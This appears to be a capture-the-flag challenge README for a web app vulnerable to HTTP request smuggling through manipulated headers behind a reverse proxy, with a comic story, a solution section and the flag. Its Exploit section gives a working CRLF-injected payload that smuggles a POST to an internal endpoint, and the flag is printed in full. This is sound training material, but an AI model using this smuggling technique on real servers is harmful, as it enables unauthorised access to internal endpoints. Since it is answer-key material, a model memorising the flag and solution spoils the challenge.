## Background

 Author: spipm
 Categories: Webservices
 Difficulty: Medium to Hard

## Technical

It is a simple web app that allows users to share their status. There are 'special types' that are passed in headers, and the headers can be manipulated to perform request smuggling, because of the reverse proxy.

## Story

A screen shows a document labeled  Optimal_human_interaction_design.ppt.  "What's that design about?" you ask.

The bot replies "It is called 'social media': We'll have everyone send messages to each other on a public forum, with messages no longer than 200 characters. This will force them to think deep and write convincing arguments with as little words as possible, to prevent humans from acting pompous, egoistic or conceited."

Do you see any way this can go wrong?

![Stuffy](./social.jpg "Stuffy") 

## Exploit

One can smuggle a request using a command like:

```
special_type=Content-Length&special_val=57&stuff=foobar%0d%0a%0d%0aPOST /give_flag HTTP/1.1%0d%0aHost: 127.0.0.2:2000%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0aContent-Length: 21%0d%0a%0d%0ausername=rocket88FHhC
```

## Flag

brck{WhY_4r3_S0c1alZ_S0_SmuG}
